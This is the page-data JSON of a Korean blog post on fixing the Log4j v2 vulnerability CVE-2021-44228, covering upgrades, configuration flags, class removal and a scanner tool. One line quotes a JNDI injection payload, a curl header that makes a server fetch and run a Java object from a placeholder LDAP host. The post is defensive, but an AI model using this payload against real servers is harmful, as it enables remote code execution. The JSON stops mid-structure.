{
    "componentChunkName": "component---src-templates-post-tsx",
    "path": "/development/etc/vulnerability-apache-log4j-v2",
    "result": {"data":{"logo":null,"markdownRemark":{"html":"<h1>개요</h1>\n<p>이 포스팅에서는 Apache의 <strong><a href=\"https://logging.apache.org/log4j/2.x\">Log4j v2</a></strong> 라이브러리의 취약점 <a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228\">CVE-2021-44228</a> 해결 방법에 대해 알아보겠습니다.</p>\n<h1>요약</h1>\n<p>이번 취약점은 Log4j의 v2에만 해당되며, 해당되는 세부 버전은 <strong>&#x3C;=2.14.1</strong> 입니다.\n취약점 해결 방법으로는 크게 5가지 방법이 있습니다.</p>\n<ol>\n<li>Log4j 버전을 <a href=\"https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1\">2.15.0</a> 이상으로 올린다. (Java <strong>>=8</strong> 필요)</li>\n<li><code class=\"language-text\">FormatMsgNoLookups</code> 값을 True로 설정한다. (Log4j <strong>>=2.10</strong> 필요)</li>\n<li>PatternLayout 설정을 변경한다. (Log4j <strong>>=2.7</strong> 필요)</li>\n<li><code class=\"language-text\">JndiLookup</code>, <code class=\"language-text\">JndiManager</code> 클래스를 제거한다. (모든 Log4j에 적용 가능)</li>\n<li>Log4j를 사용하지 않는다.</li>\n</ol>\n<h1>취약점 해결법</h1>\n<p>다음 5가지 항목중 하나를 적용함으로 취약점 해결이 가능합니다.</p>\n<h2>Log4j 버전을 2.15.0 이상으로 변경</h2>\n<p>별다른 설정 없이 Log4j 버전을 <strong>>=2.15.0</strong>로 올림으로 취약점 해결이 가능합니다.<br>\n단, Java <strong>>=8</strong>을 사용하는 환경에서만 가능합니다.</p>\n<p>만약 Java <strong>&#x3C;8</strong>을 사용한다면 다른 해결 방법을 적용하도록 합니다.</p>\n<h2>FormatMsgNoLookups 값을 True로 설정</h2>\n<p>Log4j 설정값 변경을 통해 취약점 해결이 가능합니다.<br>\n단, Log4j <strong>>2.10</strong>를 사용하는 환경에서만 가능합니다.</p>\n<p><code class=\"language-text\">log4j2.formatMsgNoLookups</code> 값을 True로 설정하면 되는데, Java 실행 옵션으로 <code class=\"language-text\">-Dlog4j2.formatMsgNoLookups=true</code>를 주면 됩니다.</p>\n<h2>PatternLayout 설정 변경</h2>\n<p>Log4j의 출력 패턴에 설정을 추가해서 해결이 가능합니다.<br>\n단, Log4j <strong>>2.7</strong>를 사용하는 환경에서만 가능합니다.</p>\n<p>메세지를 출력하는 패턴인 <code class=\"language-text\">%m</code>, <code class=\"language-text\">%msg</code>, <code class=\"language-text\">%massage</code> 뒤에 <strong>{nolookups}</strong> 를 붙여서\n<code class=\"language-text\">%m{nolookups}</code>, <code class=\"language-text\">%msg{nolookups}</code>, <code class=\"language-text\">%massage{nolookups}</code>로 설정하면 됩니다.</p>\n<h2>JndiLookup, JndiManager 클래스 제거</h2>\n<p><code class=\"language-text\">log4j-core.jar</code>의 <code class=\"language-text\">JdniLookup</code>, <code class=\"language-text\">JdniManager</code> 클래스를 제거해서 해결이 가능합니다.</p>\n<p><a href=\"https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389\">KISA에서 제안</a>하는 다음 명령어를 실행하면 됩니다.\n<code class=\"language-text\">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></p>\n<h2>Log4j 제거</h2>\n<p>원천적인 방법으로 취약점이 있는 Log4j를 사용하지 않음으로 해결이 가능합니다.</p>\n<h1>취약점 공격 방식</h1>\n<p>이번 취약점 공격 방식은 원격 코드를 실행(RCE, Remote Code Execution)하는 방식으로, Log4j에서 남기는 로그 메세지에\n원격의 자바 객체 주소를 포함시켜 실행하는 공격 방식이라고 합니다.</p>\n<p><a href=\"https://asec.ahnlab.com/ko/29479\">Ahnlab에서 제공하는 공격의 예시</a>로는 다음과 같은 명령을 실행하도록 해서 xxx.xxx.xxx.xxx/a 에 위치한 자바 객체를 자동으로 서버에서 실행 시키도록 한다고 합니다.<br>\n<code class=\"language-text\">curl 127.0.0.1:8080 -H ‘X-Api-Version: ${jndi:ldap://xxx.xxx.xxx.xxx/a}’</code></p>\n<h1>취약한지 확인 방법</h1>\n<p><a href=\"https://github.com/logpresso/CVE-2021-44228-Scanner?fbclid=IwAR084knrPF7iODbRVnFPRqUfyF0vbmoHYRv8qRiBp4hhXaPSEtEHuOBz3yU\">Logpresso 에서 제공하는 툴</a>을 사용해서\n취약한지 확인이 가능합니다.<br>\n사용 방법으로는 툴을 다운받은 후 다음 명령으로 실행하면 됩니다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token operator\">></span> log4j2-scan <span class=\"token punctuation\">{</span>target_path<span class=\"token punctuation\">}</span></code></pre></div>\n<p>그러면, 아래와 같이 취약한 부분에 대해 출력해줍니다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">CMD<span class=\"token operator\">></span> log4j2-scan.exe D:<span class=\"token punctuation\">\\</span>tmp\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>elasticsearch-7.16.0<span class=\"token punctuation\">\\</span>bin<span class=\"token punctuation\">\\</span>elasticsearch-sql-cli-7.16.0.jar, log4j <span class=\"token number\">2.11</span>.1\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>elasticsearch-7.16.0<span class=\"token punctuation\">\\</span>lib<span class=\"token punctuation\">\\</span>log4j-core-2.11.1.jar, log4j <span class=\"token number\">2.11</span>.1\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>flink-1.14.0<span class=\"token punctuation\">\\</span>lib<span class=\"token punctuation\">\\</span>log4j-core-2.14.1.jar, log4j <span class=\"token number\">2.14</span>.1\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>logstash-7.16.0<span class=\"token punctuation\">\\</span>logstash-core<span class=\"token punctuation\">\\</span>lib<span class=\"token punctuation\">\\</span>jars<span class=\"token punctuation\">\\</span>log4j-core-2.14.0.jar, log4j <span class=\"token number\">2.14</span>.0\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>logstash-7.16.0<span class=\"token punctuation\">\\</span>vendor<span class=\"token punctuation\">\\</span>bundle<span class=\"token punctuation\">\\</span>jruby<span class=\"token punctuation\">\\</span><span class=\"token number\">2.5</span>.0<span class=\"token punctuation\">\\</span>gems<span class=\"token punctuation\">\\</span>logstash-input-tcp-6.2.1-java<span class=\"token punctuation\">\\</span>vendor<span class=\"token punctuation\">\\</span>jar-dependencies<span class=\"token punctuation\">\\</span>org<span class=\"token punctuation\">\\</span>logstash<span class=\"token punctuation\">\\</span>inputs<span class=\"token punctuation\">\\</span>logstash-input-tcp<span class=\"token punctuation\">\\</span><span class=\"token number\">6.2</span>.1<span class=\"token punctuation\">\\</span>logstash-input-tcp-6.2.1.jar, log4j <span class=\"token number\">2.9</span>.1\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>solr-7.7.3<span class=\"token punctuation\">\\</span>solr-7.7.3<span class=\"token punctuation\">\\</span>contrib<span class=\"token punctuation\">\\</span>prometheus-exporter<span class=\"token punctuation\">\\</span>lib<span class=\"token punctuation\">\\</span>log4j-core-2.11.0.jar, log4j <span class=\"token number\">2.11</span>.0\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>solr-7.7.3<span class=\"token punctuation\">\\</span>solr-7.7.3<span class=\"token punctuation\">\\</span>server<span class=\"token punctuation\">\\</span>lib<span class=\"token punctuation\">\\</span>ext<span class=\"token punctuation\">\\</span>log4j-core-2.11.0.jar, log4j <span class=\"token number\">2.11</span>.0\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>solr-8.11.0<span class=\"token punctuation\">\\</span>contrib<span class=\"token punctuation\">\\</span>prometheus-exporter<span class=\"token punctuation\">\\</span>lib<span class=\"token punctuation\">\\</span>log4j-core-2.14.1.jar, log4j <span class=\"token number\">2.14</span>.1\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> Found CVE-2021-44228 vulnerability <span class=\"token keyword\">in</span> D:<span class=\"token punctuation\">\\</span>tmp<span class=\"token punctuation\">\\</span>solr-8.11.0<span class=\"token punctuation\">\\</span>server<span class=\"token punctuation\">\\</span>lib<span class=\"token punctuation\">\\</span>ext<span class=\"token punctuation\">\\</span>log4j-core-2.14.1.jar, log4j <span class=\"token number\">2.14</span>.1\n\nScanned <span class=\"token number\">5047</span> directories and <span class=\"token number\">26251</span> files\nFound <span class=\"token number\">9</span> vulnerable files\nCompleted <span class=\"token keyword\">in</span> <span class=\"token number\">0.42</span> seconds</code></pre></div>\n<p>위 툴은 제공된 경로의 모든 하위경로의 <strong>.jar</strong> 파일을 찾고, 취약한 Log4j 버전이 사용되는지 확인해서 출력하는 방식이라고 합니다.</p>\n<h1>줄이며…</h1>\n<p>지금까지 Log4j v2의 취약점 해결 방법에 대해 알아보았습니다.<br>\n많은 프로젝트에서 사용하는 라이브러리에 크리티컬한 취약점 발생시, 그 여파가 얼마나 큰지 느낄 수 있는 경험이었습니다.</p>","htmlAst":{"type":"root","children":[{"type":"element","tagName":"h1","properties":{},"children":[{"type":"text","value":"개요"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"이 포스팅에서는 Apache의 "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"element","tagName":"a","properties":{"href":"https://logging.apache.org/log4j/2.x"},"children":[{"type":"text","value":"Log4j v2"}]}]},{"type":"text","value":" 라이브러리의 취약점 "},{"type":"element","tagName":"a","properties":{"href":"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"},"children":[{"type":"text","value":"CVE-2021-44228"}]},{"type":"text","value":" 해결 방법에 대해 알아보겠습니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h1","properties":{},"children":[{"type":"text","value":"요약"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"이번 취약점은 Log4j의 v2에만 해당되며, 해당되는 세부 버전은 "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":"<=2.14.1"}]},{"type":"text","value":" 입니다.\n취약점 해결 방법으로는 크게 5가지 방법이 있습니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"ol","properties":{},"children":[{"type":"text","value":"\n"},{"type":"element","tagName":"li","properties":{},"children":[{"type":"text","value":"Log4j 버전을 "},{"type":"element","tagName":"a","properties":{"href":"https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1"},"children":[{"type":"text","value":"2.15.0"}]},{"type":"text","value":" 이상으로 올린다. (Java "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":">=8"}]},{"type":"text","value":" 필요)"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"li","properties":{},"children":[{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"FormatMsgNoLookups"}]},{"type":"text","value":" 값을 True로 설정한다. (Log4j "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":">=2.10"}]},{"type":"text","value":" 필요)"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"li","properties":{},"children":[{"type":"text","value":"PatternLayout 설정을 변경한다. (Log4j "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":">=2.7"}]},{"type":"text","value":" 필요)"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"li","properties":{},"children":[{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"JndiLookup"}]},{"type":"text","value":", "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"JndiManager"}]},{"type":"text","value":" 클래스를 제거한다. (모든 Log4j에 적용 가능)"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"li","properties":{},"children":[{"type":"text","value":"Log4j를 사용하지 않는다."}]},{"type":"text","value":"\n"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h1","properties":{},"children":[{"type":"text","value":"취약점 해결법"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"다음 5가지 항목중 하나를 적용함으로 취약점 해결이 가능합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h2","properties":{},"children":[{"type":"text","value":"Log4j 버전을 2.15.0 이상으로 변경"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"별다른 설정 없이 Log4j 버전을 "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":">=2.15.0"}]},{"type":"text","value":"로 올림으로 취약점 해결이 가능합니다."},{"type":"element","tagName":"br","properties":{},"children":[]},{"type":"text","value":"\n단, Java "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":">=8"}]},{"type":"text","value":"을 사용하는 환경에서만 가능합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"만약 Java "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":"<8"}]},{"type":"text","value":"을 사용한다면 다른 해결 방법을 적용하도록 합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h2","properties":{},"children":[{"type":"text","value":"FormatMsgNoLookups 값을 True로 설정"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Log4j 설정값 변경을 통해 취약점 해결이 가능합니다."},{"type":"element","tagName":"br","properties":{},"children":[]},{"type":"text","value":"\n단, Log4j "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":">2.10"}]},{"type":"text","value":"를 사용하는 환경에서만 가능합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"log4j2.formatMsgNoLookups"}]},{"type":"text","value":" 값을 True로 설정하면 되는데, Java 실행 옵션으로 "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"-Dlog4j2.formatMsgNoLookups=true"}]},{"type":"text","value":"를 주면 됩니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h2","properties":{},"children":[{"type":"text","value":"PatternLayout 설정 변경"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"Log4j의 출력 패턴에 설정을 추가해서 해결이 가능합니다."},{"type":"element","tagName":"br","properties":{},"children":[]},{"type":"text","value":"\n단, Log4j "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":">2.7"}]},{"type":"text","value":"를 사용하는 환경에서만 가능합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"메세지를 출력하는 패턴인 "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"%m"}]},{"type":"text","value":", "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"%msg"}]},{"type":"text","value":", "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"%massage"}]},{"type":"text","value":" 뒤에 "},{"type":"element","tagName":"strong","properties":{},"children":[{"type":"text","value":"{nolookups}"}]},{"type":"text","value":" 를 붙여서\n"},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"%m{nolookups}"}]},{"type":"text","value":", "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"%msg{nolookups}"}]},{"type":"text","value":", "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"%massage{nolookups}"}]},{"type":"text","value":"로 설정하면 됩니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h2","properties":{},"children":[{"type":"text","value":"JndiLookup, JndiManager 클래스 제거"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"log4j-core.jar"}]},{"type":"text","value":"의 "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"JdniLookup"}]},{"type":"text","value":", "},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"JdniManager"}]},{"type":"text","value":" 클래스를 제거해서 해결이 가능합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"element","tagName":"a","properties":{"href":"https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389"},"children":[{"type":"text","value":"KISA에서 제안"}]},{"type":"text","value":"하는 다음 명령어를 실행하면 됩니다.\n"},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class"}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h2","properties":{},"children":[{"type":"text","value":"Log4j 제거"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"원천적인 방법으로 취약점이 있는 Log4j를 사용하지 않음으로 해결이 가능합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h1","properties":{},"children":[{"type":"text","value":"취약점 공격 방식"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"이번 취약점 공격 방식은 원격 코드를 실행(RCE, Remote Code Execution)하는 방식으로, Log4j에서 남기는 로그 메세지에\n원격의 자바 객체 주소를 포함시켜 실행하는 공격 방식이라고 합니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"element","tagName":"a","properties":{"href":"https://asec.ahnlab.com/ko/29479"},"children":[{"type":"text","value":"Ahnlab에서 제공하는 공격의 예시"}]},{"type":"text","value":"로는 다음과 같은 명령을 실행하도록 해서 xxx.xxx.xxx.xxx/a 에 위치한 자바 객체를 자동으로 서버에서 실행 시키도록 한다고 합니다."},{"type":"element","tagName":"br","properties":{},"children":[]},{"type":"text","value":"\n"},{"type":"element","tagName":"code","properties":{"className":["language-text"]},"children":[{"type":"text","value":"curl 127.0.0.1:8080 -H ‘X-Api-Version: ${jndi:ldap://xxx.xxx.xxx.xxx/a}’"}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"h1","properties":{},"children":[{"type":"text","value":"취약한지 확인 방법"}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"element","tagName":"a","properties":{"href":"https://github.com/logpresso/CVE-2021-44228-Scanner?fbclid=IwAR084knrPF7iODbRVnFPRqUfyF0vbmoHYRv8qRiBp4hhXaPSEtEHuOBz3yU"},"children":[{"type":"text","value":"Logpresso 에서 제공하는 툴"}]},{"type":"text","value":"을 사용해서\n취약한지 확인이 가능합니다."},{"type":"element","tagName":"br","properties":{},"children":[]},{"type":"text","value":"\n사용 방법으로는 툴을 다운받은 후 다음 명령으로 실행하면 됩니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"div","properties":{"className":["gatsby-highlight"],"dataLanguage":"bash"},"children":[{"type":"element","tagName":"pre","properties":{"className":["language-bash"]},"children":[{"type":"element","tagName":"code","properties":{"className":["language-bash"]},"children":[{"type":"element","tagName":"span","properties":{"className":["token","operator"]},"children":[{"type":"text","value":">"}]},{"type":"text","value":" log4j2-scan "},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"{"}]},{"type":"text","value":"target_path"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"}"}]}]}]}]},{"type":"text","value":"\n"},{"type":"element","tagName":"p","properties":{},"children":[{"type":"text","value":"그러면, 아래와 같이 취약한 부분에 대해 출력해줍니다."}]},{"type":"text","value":"\n"},{"type":"element","tagName":"div","properties":{"className":["gatsby-highlight"],"dataLanguage":"bash"},"children":[{"type":"element","tagName":"pre","properties":{"className":["language-bash"]},"children":[{"type":"element","tagName":"code","properties":{"className":["language-bash"]},"children":[{"type":"text","value":"CMD"},{"type":"element","tagName":"span","properties":{"className":["token","operator"]},"children":[{"type":"text","value":">"}]},{"type":"text","value":" log4j2-scan.exe D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"elasticsearch-7.16.0"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"bin"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"elasticsearch-sql-cli-7.16.0.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.11"}]},{"type":"text","value":".1\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"elasticsearch-7.16.0"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"lib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"log4j-core-2.11.1.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.11"}]},{"type":"text","value":".1\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"flink-1.14.0"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"lib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"log4j-core-2.14.1.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.14"}]},{"type":"text","value":".1\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"logstash-7.16.0"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"logstash-core"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"lib"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"jars"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"log4j-core-2.14.0.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.14"}]},{"type":"text","value":".0\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" D:"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"tmp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"logstash-7.16.0"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"vendor"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"bundle"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"jruby"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.5"}]},{"type":"text","value":".0"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"gems"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"logstash-input-tcp-6.2.1-java"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"vendor"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"jar-dependencies"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"org"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"logstash"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"inputs"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"logstash-input-tcp"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"6.2"}]},{"type":"text","value":".1"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"\\"}]},{"type":"text","value":"logstash-input-tcp-6.2.1.jar, log4j "},{"type":"element","tagName":"span","properties":{"className":["token","number"]},"children":[{"type":"text","value":"2.9"}]},{"type":"text","value":".1\n"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"["}]},{"type":"text","value":"*"},{"type":"element","tagName":"span","properties":{"className":["token","punctuation"]},"children":[{"type":"text","value":"]"}]},{"type":"text","value":" Found CVE-2021-44228 vulnerability "},{"type":"element","tagName":"span","properties":{"className":["token","keyword"]},"children":[{"type":"text","value":"in"}]},{"type":"text","value":" 